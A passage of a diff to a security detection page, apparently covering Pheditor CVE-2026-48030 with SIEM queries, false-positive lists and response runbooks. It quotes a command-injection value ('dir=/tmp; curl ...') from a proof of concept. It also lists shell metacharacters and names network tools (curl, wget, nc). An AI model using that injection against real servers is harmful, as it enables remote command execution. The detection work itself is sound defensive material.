-    <div class="tab-content" id="art-100-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @user.name:(www-data OR apache OR nginx OR nobody OR httpd OR _www) (@file.path:/var/www/* OR @file.path:/srv/www/* OR @file.path:/usr/share/nginx/html/* OR @file.path:/srv/http/*) (@file.path:*.php OR @file.path:*.phtml OR @file.path:*.phar)</code></pre></div>
-    <div class="tab-content" id="art-100-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=FileWritten
-| ContextImageFileName=/\/(php-fpm|php|php-cgi|apache2|httpd|nginx|sh|bash|dash)$/i
-| TargetFileName=/\/(var\/www|srv\/www|usr\/share\/nginx\/html|srv\/http)\/.+\.(php|phtml|phar)$/i
-| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())</code></pre></div>
-    <div class="tab-content" id="art-100-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php-cgi&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;) AND Filesystem.user IN (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;_www&quot;) AND (Filesystem.file_path=&quot;/var/www/*&quot; OR Filesystem.file_path=&quot;/srv/www/*&quot; OR Filesystem.file_path=&quot;/usr/share/nginx/html/*&quot; OR Filesystem.file_path=&quot;/srv/http/*&quot;) AND Filesystem.file_name=&quot;*.php&quot; AND Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;) by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path Filesystem.file_name Filesystem.file_hash | `drop_dm_object_name(Filesystem)` | convert ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-100-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php-cgi&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;) AND Filesystem.user IN (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;_www&quot;) AND (Filesystem.file_path=&quot;/var/www/*&quot; OR Filesystem.file_path=&quot;/srv/www/*&quot; OR Filesystem.file_path=&quot;/usr/share/nginx/html/*&quot; OR Filesystem.file_path=&quot;/srv/http/*&quot;) AND Filesystem.file_name=&quot;*.php&quot; AND Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;) by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path Filesystem.file_name Filesystem.file_hash | `drop_dm_object_name(Filesystem)` | convert ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+    <div class="tab-content" id="art-100-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:PATH @file.name:*.php @file.path:(*/var/www/* OR */srv/www/* OR */usr/share/nginx/html/* OR */var/lib/nginx/*) @process.name:(php-fpm OR php OR apache2 OR httpd OR nginx OR sh OR bash) @user.name:(www-data OR apache OR nginx OR nobody)</code></pre></div>
+    <div class="tab-content" id="art-100-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=FileWritten TargetFileName=/\.php$/i
+| regex(&quot;/(var/www|srv/www|usr/share/nginx/html|var/lib/nginx|opt/lampp/htdocs)/&quot;, field=TargetFileName)
+| ContextImageFileName=/(php-fpm|php|apache2|httpd|nginx|sh|bash)$/i
+| UserName=/(www-data|apache|nginx|nobody)/i
+| groupBy([aid, ComputerName, UserName, ContextImageFileName, TargetFileName], function=count())</code></pre></div>
+    <div class="tab-content" id="art-100-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as file_paths from datamodel=Endpoint.Filesystem where Filesystem.action=&quot;created&quot; Filesystem.file_name=&quot;*.php&quot; Filesystem.file_path IN (&quot;/var/www/*&quot;,&quot;/srv/www/*&quot;,&quot;/usr/share/nginx/html/*&quot;,&quot;/var/lib/nginx/*&quot;,&quot;/opt/*/www/*&quot;) Filesystem.process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;) by host, Filesystem.user, Filesystem.process_name, Filesystem.file_name, Filesystem.file_path | `drop_dm_object_name(Filesystem)` | `security_content_ctime(firstTime)`</code></pre><pre class="spl-mode-body" id="art-100-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as file_paths from datamodel=Endpoint.Filesystem where Filesystem.action=&quot;created&quot; Filesystem.file_name=&quot;*.php&quot; Filesystem.file_path IN (&quot;/var/www/*&quot;,&quot;/srv/www/*&quot;,&quot;/usr/share/nginx/html/*&quot;,&quot;/var/lib/nginx/*&quot;,&quot;/opt/*/www/*&quot;) Filesystem.process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;) by host, Filesystem.user, Filesystem.process_name, Filesystem.file_name, Filesystem.file_path | `drop_dm_object_name(Filesystem)` | `security_content_ctime(firstTime)`</code></pre></div></div>
   </div>
 </details>
-<details class="uc" data-uc-slug="de850c0e87" data-platforms="def,sent,spl" data-targets="">
+<details class="uc" data-uc-slug="d98c51c750" data-platforms="datadog,def,falcon,sent,spl" data-targets="linux,windows">
   <summary>
-    <span class="uc-title">Pheditor CVE-2026-48030 — vulnerable Pheditor 2.0.1–2.0.3 asset inventory exposure</span>
+    <span class="uc-title">Pheditor CVE-2026-48030 vulnerable-version asset inventory</span>
     <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Reconnaissance</span>
     <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="de850c0e87" title="Copy share link to this UC" aria-label="Copy share link">
+    <button class="share-btn" data-share-uc="d98c51c750" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Surfaces hosts running pheditor/pheditor in the affected version range (&gt;=2.0.1, &lt;=2.0.3) and flags internet-facing instances for priority patching. Combines TVM vulnerability data with DeviceInfo internet-facing tag so SOC can prioritise external exposure first.
+    <div class="uc-desc">Identifies pheditor/pheditor composer package installations at vulnerable versions (&gt;= 2.0.1, &lt;= 2.0.3) across managed Linux web servers. Patch-management hunt feeding both vulnerability response and exposure prioritization.
 
-Rationale: GHSA states affected range composer:pheditor/pheditor &gt;=2.0.1, &lt;=2.0.3. Pairing TVM software inventory + CVE lookup with DeviceInfo.IsInternetFacing is the textbook &#x27;patch the exposed assets first&#x27; pivot and stops the exploit before any of the runtime UCs even fire. Cross-checked against the GitHub advisory packages section and the composer/packagist package listing.
+Rationale: GHSA advisory explicitly names the vulnerable composer package `composer:pheditor/pheditor` and version range &gt;= 2.0.1, &lt;= 2.0.3. Inventory + internet-facing flag prioritizes patching.
 
 Cross-checked against:
-  • https://github.com/advisories/GHSA-jvc5-6g7q-c843
-  • https://packagist.org/packages/pheditor/pheditor</div>
+  • https://github.com/advisories/GHSA-jvc5-6g7q-c843</div>
     <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
     <div class="uc-meta"><span class="ind-label">Data sources</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>TVM not seeing the package because pheditor was installed via composer without registering in OS package manager (false negative more than positive)</li><li>Test/lab hosts running Pheditor intentionally for security research — flagged but not actionable</li><li>Mirror / replica instances where the canary version string was patched but the binary itself wasn&#x27;t</li><li>Vendor-shipped appliances bundling pheditor as a sub-component without exposing version string</li><li>CMDB stale records pointing at decommissioned hosts that no longer run pheditor</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage — for each hit, confirm pheditor is actually running (curl -I http://host/pheditor.php) and capture the version banner from the login page; record whether terminal permission is enabled (article notes default-on). 2) Contain — for internet-facing hits, take the endpoint offline behind WAF deny or remove the vhost until patched; rotate the pheditor admin password (article PoC used &#x27;admin&#x27;); enforce IP allow-listing on the management endpoint. 3) Hunt — for every host on this list, retro-search the companion UCs (POST to pheditor.php with metachars, php→sh spawn, .php writes to webroot) over the last 90 days to determine if exploitation already happened pre-patch.</div></details>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Internal-only Pheditor instances reachable only via VPN — lower priority but still patchable</li><li>Test/dev environments running vulnerable versions intentionally for security research</li><li>Honeypots deliberately exposing vulnerable Pheditor</li><li>Archived/decommissioned servers still answering on legacy IPs</li><li>Pheditor installations &gt;= 2.0.4 mis-tagged by older inventory scans</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 (Triage): For each hit, confirm version via on-host `composer show pheditor/pheditor` or grep VERSION constant in pheditor.php. Mark internet-facing instances P0, internal P1.
+Step 2 (Contain): For P0 internet-facing assets, immediately push WAF rule blocking POST to pheditor.php with shell metacharacters in dir param (see UC #2). Schedule emergency upgrade to &gt;= 2.0.4 within 24h.
+Step 3 (Hunt): Review web access logs for each identified host for the prior 90 days — look for any historical POST to pheditor.php with dir= containing `;|&amp;`$()` to determine if any host was exploited before patch.</div></details>
     <div class="tabs">
       <button class="tab-btn active" data-target="art-100-uc3-kql">Defender KQL</button>
       <button class="tab-btn" data-target="art-100-uc3-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-100-uc3-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-100-uc3-falcon">Falcon LogScale</button>
       <button class="tab-btn" data-target="art-100-uc3-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-100-uc3-kql"><pre><button class="copy-btn">COPY</button><code>let Vuln = DeviceTvmSoftwareVulnerabilities
-  | where Timestamp &gt; ago(7d)
-  | where CveId =~ &quot;CVE-2026-48030&quot;
-  | project Timestamp, DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, CveId;
-let Inv = DeviceTvmSoftwareInventory
-  | where Timestamp &gt; ago(7d)
-  | where SoftwareName has &quot;pheditor&quot; or SoftwareVendor has &quot;pheditor&quot;
-  | where SoftwareVersion in~ (&quot;2.0.1&quot;,&quot;2.0.2&quot;,&quot;2.0.3&quot;)
-  | project Timestamp, DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion;
-let Surface = DeviceInfo
-  | where Timestamp &gt; ago(7d)
-  | summarize arg_max(Timestamp, IsInternetFacing, PublicIP, MachineGroup, OSPlatform) by DeviceId, DeviceName;
-union Vuln, Inv
-| summarize arg_max(Timestamp, *) by DeviceId
-| join kind=leftouter Surface on DeviceId
-| project Timestamp, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, IsInternetFacing, PublicIP, MachineGroup
-| order by IsInternetFacing desc, DeviceName asc</code></pre></div>
-    <div class="tab-content" id="art-100-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>let Vuln = DeviceTvmSoftwareVulnerabilities
-  | where TimeGenerated &gt; ago(7d)
-  | where CveId =~ &quot;CVE-2026-48030&quot;
-  | project TimeGenerated, DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel, CveId;
-let Surface = DeviceInfo
-  | where TimeGenerated &gt; ago(7d)
-  | summarize arg_max(TimeGenerated, IsInternetFacing, PublicIP, MachineGroup, OSPlatform) by DeviceId, DeviceName;
-Vuln
-| join kind=leftouter Surface on DeviceId
-| project TimeGenerated, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, IsInternetFacing, PublicIP, MachineGroup
-| order by IsInternetFacing desc, DeviceName asc</code></pre></div>
-    <div class="tab-content" id="art-100-uc3-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><pre><button class="copy-btn">COPY</button><code>| inputlookup vulnerability_scan_results.csv | search (cve_id=&quot;CVE-2026-48030&quot; OR (software_name=&quot;*pheditor*&quot; AND (software_version=&quot;2.0.1&quot; OR software_version=&quot;2.0.2&quot; OR software_version=&quot;2.0.3&quot;))) | eval is_internet_facing=if(internet_facing=&quot;true&quot;,1,0) | stats values(software_version) as versions, values(cve_id) as cves, max(is_internet_facing) as exposed by host_name, ip_address | sort -exposed, host_name</code></pre></div>
+    <div class="tab-content active" id="art-100-uc3-kql"><pre><button class="copy-btn">COPY</button><code>// Defender TVM does not currently track pheditor as a CPE; supplement with on-host evidence.
+DeviceFileEvents
+| where Timestamp &gt; ago(30d)
+| where FileName == &quot;pheditor.php&quot;
+| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Hosts=make_set(DeviceName), Paths=make_set(FolderPath) by FileName
+| join kind=inner (
+    DeviceInfo
+    | where Timestamp &gt; ago(1d)
+    | summarize arg_max(Timestamp, *) by DeviceId
+    | project DeviceId, DeviceName, IsInternetFacing, PublicIP, OSDistribution
+) on $left.Hosts has $right.DeviceName
+| project DeviceName, IsInternetFacing, PublicIP, OSDistribution, FirstSeen, LastSeen, Paths</code></pre></div>
+    <div class="tab-content" id="art-100-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>DeviceTvmSoftwareVulnerabilities
+| where TimeGenerated &gt; ago(1d)
+| where CveId == &quot;CVE-2026-48030&quot; or (SoftwareVendor =~ &quot;pheditor&quot; and SoftwareName =~ &quot;pheditor&quot; and SoftwareVersion in (&quot;2.0.1&quot;,&quot;2.0.2&quot;,&quot;2.0.3&quot;))
+| join kind=leftouter (
+    DeviceInfo
+    | where TimeGenerated &gt; ago(1d)
+    | summarize arg_max(TimeGenerated, *) by DeviceId
+    | project DeviceId, IsInternetFacing, PublicIP
+) on DeviceId
+| project TimeGenerated, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, IsInternetFacing, PublicIP</code></pre></div>
+    <div class="tab-content" id="art-100-uc3-datadog"><pre><button class="copy-btn">COPY</button><code>(source:linux.syslog OR source:nginx.access OR source:apache.access) (@http.url_details.path:*pheditor.php* OR @file.path:*pheditor.php*)</code></pre></div>
+    <div class="tab-content" id="art-100-uc3-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=FileOpenInfo TargetFileName=/pheditor\.php$/i
+| groupBy([aid, ComputerName, TargetFileName], function={ count() | _firstSeen := min(_time) | _lastSeen := max(_time) })</code></pre></div>
+    <div class="tab-content" id="art-100-uc3-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><pre><button class="copy-btn">COPY</button><code>| inputlookup composer_inventory.csv | search package=&quot;pheditor/pheditor&quot; version IN (&quot;2.0.1&quot;,&quot;2.0.2&quot;,&quot;2.0.3&quot;) | join type=outer host [search index=web sourcetype IN (&quot;nginx:plus:access&quot;,&quot;access_combined&quot;,&quot;ms:iis:default&quot;) uri_path=&quot;*pheditor.php&quot; | stats count by host dest_ip] | table host, package, version, internet_facing, last_seen, count</code></pre></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="b453d42ee7" data-platforms="datadog,def,falcon,sent,spl" data-targets="linux,windows">
+  <summary>
+    <span class="uc-title">Pheditor authenticated terminal POST followed by web-server account egress</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Command &amp; Control</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="b453d42ee7" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Time-window correlation pinning the CVE-2026-48030 kill chain: an authenticated POST to pheditor.php with action=terminal followed within seconds by an outbound network connection from the web-server-account process. Catches the curl/wget exfil pattern from the PoC even when WAF inspection is blind to the dir parameter.
+
+Rationale: Article PoC Step 4 demonstrates `dir=/tmp; curl -s https://ifconfig.me #` — the immediate curl egress from www-data context within seconds of the POST is the highest-fidelity exploitation signature, even if the WAF didn&#x27;t decode the dir body.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-jvc5-6g7q-c843</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Web Protocols">T1071.001</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span> <span class="ind">Endpoint.Processes</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Composer / npm operations running as www-data during deploys (fetch packages from registries)</li><li>WordPress / Drupal core update reaching out to api.wordpress.org or updates.drupal.org</li><li>Let&#x27;s Encrypt certbot renewals invoked by web-server cron</li><li>Application telemetry pings to legitimate APIs (Sentry, NewRelic) from PHP backends</li><li>Pheditor itself fetching plugin/update metadata</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (RemoteUrl has_any (&quot;packagist.org&quot;,&quot;github.com&quot;,&quot;githubusercontent.com&quot;,&quot;composer.org&quot;,&quot;api.wordpress.org&quot;,&quot;updates.drupal.org&quot;,&quot;acme-v02.api.letsencrypt.org&quot;,&quot;registry.npmjs.org&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 (Triage): Decode the RemoteUrl/RemoteIP. Is it a known package mirror, CDN, or pastebin/IP-logger (ifconfig.me, requestbin, webhook.site, transfer.sh)? Pull the exact ProcessCommandLine of the curl/wget — flags `-o /tmp/...`, `| sh`, or `| bash` are immediate escalators.
+Step 2 (Contain): Block the remote IP/domain at egress. Kill the curl PID. Capture any files downloaded to /tmp or /dev/shm before they execute. Snapshot the host for forensics. Disable Pheditor terminal feature (`TERMINAL_ENABLED=false` in config) until patched.
+Step 3 (Hunt): Pivot on the remote IP across the entire fleet — same C2 may be hitting multiple compromised Pheditor instances. Run UC #3 (webshell drop) and UC #1 (php→sh) for the same host across a 30-day window to map full activity.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-100-uc4-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-100-uc4-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-100-uc4-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-100-uc4-falcon">Falcon LogScale</button>
+      <button class="tab-btn" data-target="art-100-uc4-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-100-uc4-kql"><pre><button class="copy-btn">COPY</button><code>let PheditorHosts = DeviceProcessEvents
+    | where Timestamp &gt; ago(7d)
+    | where InitiatingProcessFileName in~ (&quot;php-fpm&quot;,&quot;php&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;)
+    | where FileName in~ (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;)
+    | where InitiatingProcessAccountName in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;)
+    | project ExploitTime=Timestamp, DeviceId, DeviceName, InitiatingProcessAccountName, ParentCmd=InitiatingProcessCommandLine, ShellCmd=ProcessCommandLine;
+DeviceNetworkEvents
+| where Timestamp &gt; ago(7d)
+| where RemoteIPType == &quot;Public&quot;
+| where InitiatingProcessAccountName in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;)
+| where InitiatingProcessFileName in~ (&quot;curl&quot;,&quot;wget&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;,&quot;php&quot;,&quot;bash&quot;,&quot;sh&quot;)
+| join kind=inner PheditorHosts on DeviceId
+| where datetime_diff(&#x27;second&#x27;, Timestamp, ExploitTime) between (0 .. 60)
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort, ExploitTime, ShellCmd
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-100-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>let PheditorPosts = W3CIISLog
+    | where TimeGenerated &gt; ago(7d)
+    | where csMethod == &quot;POST&quot; and csUriStem endswith &quot;pheditor.php&quot;
+    | where tostring(csUriQuery) has &quot;action=terminal&quot;
+    | project PostTime=TimeGenerated, Host=Computer, ClientIP=cIP, UA=csUserAgent;
+ImNetworkSession
+| where TimeGenerated &gt; ago(7d)
+| where SrcUsername in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;)
+| where NetworkDirection =~ &quot;Outbound&quot;
+| join kind=inner PheditorPosts on $left.SrcHostname == $right.Host
+| where datetime_diff(&#x27;second&#x27;, TimeGenerated, PostTime) between (0 .. 60)
+| project TimeGenerated, SrcHostname, SrcUsername, DstIpAddr, DstPortNumber, Url, PostTime, ClientIP, UA
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-100-uc4-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE @user.name:(www-data OR apache OR nginx OR nobody) @process.name:(curl OR wget OR nc OR ncat OR python OR python3 OR perl) @process.parent.name:(php-fpm OR php OR apache2 OR httpd OR nginx OR sh OR bash) -@network.destination.ip:(10.0.0.0/8 OR 172.16.0.0/12 OR 192.168.0.0/16)</code></pre></div>
+    <div class="tab-content" id="art-100-uc4-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=NetworkConnectIP4 ContextImageFileName=/(curl|wget|nc|ncat|python|python3|perl|php|bash|sh)$/i
+| NOT cidr(&quot;10.0.0.0/8&quot;, field=RemoteAddressIP4)
+| NOT cidr(&quot;172.16.0.0/12&quot;, field=RemoteAddressIP4)
+| NOT cidr(&quot;192.168.0.0/16&quot;, field=RemoteAddressIP4)
+| join({
+    #event_simpleName=ProcessRollup2
+    | ParentBaseFileName=/(php-fpm|php|apache2|httpd|nginx)$/i
+    | ImageFileName=/(sh|bash|dash)$/i
+    | UserName=/(www-data|apache|nginx|nobody)/i
+  }, field=aid, include=[UserName, ParentBaseFileName, CommandLine])
+| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())</code></pre></div>
+    <div class="tab-content" id="art-100-uc4-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.user IN (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;) Processes.process_name IN (&quot;curl&quot;,&quot;wget&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;,&quot;php&quot;,&quot;bash&quot;) Processes.parent_process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;) by host, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process | `drop_dm_object_name(Processes)` | join type=inner host [search index=web sourcetype IN (&quot;nginx:plus:access&quot;,&quot;access_combined&quot;) uri_path=&quot;*pheditor.php*&quot; method=POST | rex field=_raw &quot;(?i)action=terminal&quot; | eval host=if(isnotnull(dest_host),dest_host,host) | bin _time span=1m | stats min(_time) as pheditor_ts by host src] | where firstTime - pheditor_ts &lt;= 60 AND firstTime - pheditor_ts &gt;= 0 | `security_content_ctime(firstTime)`</code></pre><pre class="spl-mode-body" id="art-100-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.user IN (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;) Processes.process_name IN (&quot;curl&quot;,&quot;wget&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;,&quot;php&quot;,&quot;bash&quot;) Processes.parent_process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;) by host, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process | `drop_dm_object_name(Processes)` | join type=inner host [search index=web sourcetype IN (&quot;nginx:plus:access&quot;,&quot;access_combined&quot;) uri_path=&quot;*pheditor.php*&quot; method=POST | rex field=_raw &quot;(?i)action=terminal&quot; | eval host=if(isnotnull(dest_host),dest_host,host) | bin _time span=1m | stats min(_time) as pheditor_ts by host src] | where firstTime - pheditor_ts &lt;= 60 AND firstTime - pheditor_ts &gt;= 0 | `security_content_ctime(firstTime)`</code></pre></div></div>
   </div>
 </details>
 <details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
@@ -22800,11 +22862,11 @@ Vuln
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
     
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-100-uc4-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-100-uc4-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-100-uc4-spl">Splunk SPL (CIM)</button>
+      <button class="tab-btn active" data-target="art-100-uc5-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-100-uc5-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-100-uc5-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-100-uc4-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
+    <div class="tab-content active" id="art-100-uc5-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
 // partitions on Timestamp instead of scanning the full retention.
 DeviceTvmSoftwareVulnerabilities
 | where Timestamp &gt; ago(1d)
@@ -22813,7 +22875,7 @@ DeviceTvmSoftwareVulnerabilities
 | project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
 | order by VulnerabilitySeverityLevel asc, DeviceName asc
 </code></pre></div>
-    <div class="tab-content" id="art-100-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
+    <div class="tab-content" id="art-100-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
 // `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
 // no Sentinel translation — track via Update / Heartbeat OS-version
